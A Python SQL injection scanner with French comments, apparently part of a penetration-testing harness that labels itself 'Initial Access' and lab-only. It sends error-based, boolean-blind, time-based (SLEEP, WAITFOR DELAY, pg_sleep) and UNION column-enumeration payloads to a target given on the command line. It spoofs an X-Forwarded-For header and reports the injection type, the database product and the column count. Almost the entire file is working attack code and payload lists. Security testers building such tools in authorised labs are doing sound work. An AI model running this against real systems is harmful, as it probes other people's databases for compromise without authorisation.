#!/usr/bin/env python3
# HARNESS-VALIDATION v2.7.0 — module SQL Injection (Phase 2, Initial Access).
# Combler le gap Phase 2 du harness : détection SQLi multi-vectorielle.
#   - v2.7 : error-based (MySQL/PostgreSQL/MSSQL/Oracle/SQLite) via regex
#   - v2.7 : boolean-blind (comparaison longueur TRUE vs FALSE)
#   - v2.7 : time-based (SLEEP / WAITFOR DELAY / pg_sleep) avec seuil 2.5s
#   - v2.7 : UNION-based column-count (jusqu'à 10 colonnes)
#   - v2.7 : reproductibilité via SEED (ordre variantes déterministe)
#   - v2.7 : timeout=5 + allow_redirects=False sur toutes les requêtes
# Cadre légal : laboratoires isolés uniquement (cf. README §Cadre légal).
import json
import random
import re
import sys
import time
from typing import Optional

import requests

HARNESS_VERSION = "2.7.0"
DEFAULT_SEED = 1337
TIME_THRESHOLD_S = 2.5          # seuil détection time-based (payload 3s)
UNION_MAX_COLUMNS = 10          # plafond énumération UNION
LEN_DIFF_TOLERANCE = 5          # tolérance bruit booléen (bytes)

# --- Args CLI ---------------------------------------------------------------
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/api"
PARAM  = sys.argv[2] if len(sys.argv) > 2 else "device_id"
SEED   = int(sys.argv[3]) if len(sys.argv) > 3 else DEFAULT_SEED

# --- Payloads error-based ---------------------------------------------------
# Variétés de quotes / commentaires / syntaxes pour déclencher une erreur SQL
# côté SGBD. Chaque variante est nommée pour traçabilité dans le rapport.
ERROR_PAYLOADS: list[tuple[str, str]] = [
    ("single_quote",          "'"),
    ("double_quote",          '"'),
    ("single_comment",        "'--"),
    ("double_comment",        '"--'),
    ("or_true_single",        "' OR '1'='1"),
    ("or_true_double",        '" OR "1"="1'),
    ("paren_close",           "')"),
    ("double_paren_close",    "'))"),
    ("union_null_single",     "' UNION SELECT NULL--"),
]

# --- Patterns d'erreur SGBD (regex, case-insensitive) -----------------------
# Chaque pattern est associé au nom du DBMS qu'il révèle.
ERROR_PATTERNS: list[tuple[str, re.Pattern[bytes]]] = [
    ("MySQL",      re.compile(rb"SQL syntax.*mysql", re.I | re.S)),
    ("PostgreSQL", re.compile(rb"PostgreSQL.*ERROR",  re.I | re.S)),
    ("MSSQL",      re.compile(rb"Microsoft SQL Server", re.I)),
    ("Oracle",     re.compile(rb"ORA-\d{5}",            re.I)),
    ("SQLite",     re.compile(rb"SQLite3::query",       re.I)),
]

# --- Payloads time-based (3 secondes par construction) ----------------------
TIME_PAYLOADS: list[tuple[str, str, str]] = [
    # (nom, payload, dbms_cible)
    ("mysql_sleep",    "' AND SLEEP(3)--",                   "MySQL"),
    ("mssql_waitfor",  "'; WAITFOR DELAY '0:0:3'--",         "MSSQL"),
    ("pg_sleep",       "'; SELECT pg_sleep(3)--",            "PostgreSQL"),
]

# --- Payloads booléens ------------------------------------------------------
BOOL_TRUE  = "' OR 1=1--"
BOOL_FALSE = "' OR 1=2--"


def detect_dbms(content: bytes) -> Optional[str]:
    """Retourne le nom du DBMS détecté via patterns d'erreur, ou None."""
    for dbms, pat in ERROR_PATTERNS:
        if pat.search(content):
            return dbms
    return None


# --- Patterns d'erreur SQL génériques (pas spécifiques à un DBMS) ----------
# Utilisés pour qualifier l'énumération UNION : un mauvais nombre de colonnes
# déclenche généralement l'un de ces messages, même s'il n'est pas dans les
# patterns DBMS spécifiques ci-dessus.
GENERIC_SQL_ERROR_PATTERNS: list[re.Pattern[bytes]] = [
    re.compile(rb"different number of columns", re.I),
    re.compile(rb"column count mismatch",          re.I),
    re.compile(rb"used SELECT statements have",    re.I),
    re.compile(rb"ORDER BY position \d+ is out",   re.I),
    re.compile(rb"all queries combined using",     re.I),
    re.compile(rb"the used SELECT statements",     re.I),
]


def has_sql_error(content: bytes) -> bool:
    """Vrai si un pattern d'erreur SQL (DBMS-spécifique OU générique) matche."""
    if detect_dbms(content) is not None:
        return True
    return any(p.search(content) for p in GENERIC_SQL_ERROR_PATTERNS)


def build_session() -> requests.Session:
    """Session HTTP keep-alive avec UA versionné."""
    s = requests.Session()
    s.headers.update({
        "User-Agent": f"harness/{HARNESS_VERSION} (sqli)",
        "X-Forwarded-For": "127.0.0.1",
        "Accept": "*/*",
    })
    return s


def fetch(session: requests.Session, payload: str) -> dict:
    """Envoie une requête GET avec le payload injecté dans PARAM.
    Retourne un dict : {status, len, ms, content, error?}.
    timeout=5 + allow_redirects=False sur chaque appel."""
    t0 = time.time()
    try:
        r = session.get(
            TARGET,
            params={PARAM: payload},
            timeout=5,
            allow_redirects=False,
        )
        return {
            "status": r.status_code,
            "len": len(r.content),
            "ms": round((time.time() - t0) * 1000, 1),
            "content": r.content,
            "error": None,
        }
    except requests.RequestException as e:
        return {
            "status": None,
            "len": 0,
            "ms": round((time.time() - t0) * 1000, 1),
            "content": b"",
            "error": type(e).__name__,
        }


def run_error_based(session: requests.Session, rng: random.Random) -> tuple[list[dict], Optional[str], Optional[str]]:
    """Phase 1 : error-based. Retourne (résultats, type_injection, dbms).
    L'ordre d'envoi est mélangé de façon reproductible via rng (SEED)."""
    ordered = ERROR_PAYLOADS[:]
    rng.shuffle(ordered)
    results = []
    dbms_detected: Optional[str] = None
    first_hit_variant: Optional[str] = None
    for variant, payload in ordered:
        r = fetch(session, payload)
        leak = False
        dbms = None
        if r["error"] is None:
            dbms = detect_dbms(r["content"])
            if dbms is not None:
                leak = True
                if dbms_detected is None:
                    dbms_detected = dbms
                    first_hit_variant = variant
        results.append({
            "variant": variant,
            "status": r["status"],
            "len": r["len"],
            "ms": r["ms"],
            "leak": leak,
            "dbms": dbms,
            "error": r["error"],
        })
    inj_type = "error_based" if dbms_detected is not None else None
    return results, inj_type, dbms_detected


def run_boolean_blind(session: requests.Session) -> tuple[dict, bool]:
    """Phase 2 : boolean-blind. Compare len(TRUE) vs len(FALSE).
    Si diff > tolérance → injectable."""
    rt = fetch(session, BOOL_TRUE)
    rf = fetch(session, BOOL_FALSE)
    diff = abs(rt["len"] - rf["len"])
    injectable = (rt["error"] is None and rf["error"] is None
                  and diff > LEN_DIFF_TOLERANCE)
    result = {
        "variant": "boolean_blind",
        "true_len": rt["len"],
        "false_len": rf["len"],
        "len_diff": diff,
        "true_status": rt["status"],
        "false_status": rf["status"],
        "true_ms": rt["ms"],
        "false_ms": rf["ms"],
        "injectable": injectable,
        "error": rt["error"] or rf["error"],
    }
    return result, injectable


def run_time_based(session: requests.Session) -> tuple[list[dict], Optional[int]]:
    """Phase 3 : time-based. Si ms > 2500ms pour un payload 3s → injectable.
    Retourne (résultats, ms_max_observé) ou None si aucun déclenché."""
    results = []
    max_ms: Optional[int] = None
    for variant, payload, dbms_cible in TIME_PAYLOADS:
        r = fetch(session, payload)
        triggered = (r["error"] is None and r["ms"] > TIME_THRESHOLD_S * 1000)
        results.append({
            "variant": variant,
            "dbms_target": dbms_cible,
            "status": r["status"],
            "ms": r["ms"],
            "triggered": triggered,
            "error": r["error"],
        })
        if triggered and (max_ms is None or r["ms"] > max_ms):
            max_ms = int(r["ms"])
    return results, max_ms


def run_union_based(session: requests.Session) -> tuple[list[dict], Optional[int]]:
    """Phase 4 : UNION column-count. Essaie 1..N colonnes, détecte le bon
    compte en comparant à un baseline BÉNIN (valeur "1") et non à un
    baseline d'erreur.

    Logique :
      - baseline_benign = fetch("1") → réponse normale (200, len L0).
      - baseline_error  = fetch("'") → réponse d'erreur SQL.
      - Pour chaque N : payload = `' UNION SELECT NULL,...,NULL--`.
        * has_err = has_sql_error(content) OR status == baseline_error.status
        * ok = (pas d'erreur AND status == baseline_benign.status)
      - Le premier N tel que ok=True est le nombre de colonnes.

    Un UNION avec le bon nombre de colonnes ne déclenche PAS d'erreur SQL :
    la réponse ressemble à la réponse bénigne (même status 200, pas de
    pattern d'erreur). Un UNION avec un mauvais nombre de colonnes déclenche
    une erreur (status 5xx ou message "different number of columns")."""
    baseline_benign = fetch(session, "1")
    bl_ok_status = baseline_benign["status"]
    baseline_error = fetch(session, "'")
    bl_err_status = baseline_error["status"]
    results = []
    union_cols: Optional[int] = None
    for n in range(1, UNION_MAX_COLUMNS + 1):
        payload = "' UNION SELECT " + ",".join(["NULL"] * n) + "--"
        r = fetch(session, payload)
        has_err = (r["error"] is not None
                   or has_sql_error(r["content"])
                   or (bl_err_status is not None
                       and r["status"] == bl_err_status
                       and r["status"] != bl_ok_status))
        # ok = la réponse ressemble au baseline bénin (pas d'erreur SQL,
        # même status que la réponse normale). On n'exige pas une égalité
        # stricte de longueur : un UNION réussi ajoute des lignes NULL,
        # le body peut être plus long que le baseline bénin.
        ok = (r["error"] is None
              and not has_err
              and r["status"] == bl_ok_status
              and bl_ok_status is not None)
        results.append({
            "variant": f"union_{n}col",
            "status": r["status"],
            "len": r["len"],
            "ms": r["ms"],
            "has_sql_error": has_err,
            "benign_status": bl_ok_status,
            "error_status": bl_err_status,
            "ok": ok,
        })
        if ok and union_cols is None:
            union_cols = n
    return results, union_cols


def main() -> None:
    rng = random.Random(SEED)
    session = build_session()

    # --- Phase 1 : error-based --------------------------------------------
    err_results, inj_type, dbms_detected = run_error_based(session, rng)

    # --- Phase 2 : boolean-blind -------------------------------------------
    bool_result, bool_injectable = run_boolean_blind(session)

    # --- Phase 3 : time-based ----------------------------------------------
    time_results, time_ms = run_time_based(session)

    # --- Phase 4 : UNION column count --------------------------------------
    union_results, union_cols = run_union_based(session)

    # --- Synthèse : déterminer le type d'injection principal ---------------
    # Priorité : error_based > time_based > union_based > boolean_blind
    injection_found = False
    final_type: Optional[str] = None
    if inj_type is not None:
        injection_found = True
        final_type = inj_type
    elif time_ms is not None:
        injection_found = True
        final_type = "time_based"
    elif union_cols is not None:
        injection_found = True
        final_type = "union_based"
    elif bool_injectable:
        injection_found = True
        final_type = "boolean_blind"

    # Concaténation ordonnée des résultats (error → boolean → time → union)
    all_results: list[dict] = list(err_results)
    all_results.append(bool_result)
    all_results.extend(time_results)
    all_results.extend(union_results)

    variants_tested = len(all_results)

    print(json.dumps({
        "module": "sqli",
        "harness_version": HARNESS_VERSION,
        "seed": SEED,
        "target": TARGET,
        "param": PARAM,
        "variants_tested": variants_tested,
        "injection_found": injection_found,
        "injection_type": final_type,
        "dbms_detected": dbms_detected,
        "union_columns": union_cols,
        "time_based_ms": time_ms,
        "boolean_injectable": bool_injectable,
        "results": all_results,
    }, indent=2))


if __name__ == "__main__":
    main()
